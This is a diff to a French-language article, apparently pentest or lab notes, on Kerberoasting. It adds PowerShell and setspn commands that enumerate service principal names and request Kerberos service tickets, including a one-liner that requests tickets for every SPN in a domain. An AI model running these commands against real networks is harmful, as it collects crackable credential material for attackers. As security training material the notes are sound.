@@ -15,6 +15,9 @@ public: true # set to true to make the article publishable
 
 #### Manuelle
 
+##### Récupérer un TGS
+
+###### Liste des comptes avec leurs SPNs
 ```shell
 # Enumérer tous les SPNs
 setspn.exe -q */*
@@ -23,8 +26,17 @@ setspn.exe -q */*
 ```powershell
 # Demander un TGS pour le SPN désiré (compte utilisateur)
 Add-Type -AssemblyName System.IdentityModel
-PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SAPService/srvtest.domain.local"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MyUSERWithSPN/srvtest.domain.local"
 ```
+
+
+```powershell
+# Demander tous les TGS possibles
+Add-Type -AssemblyName System.IdentityModel
+setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+
 
 #### Utiliser Rubeus.exe
 
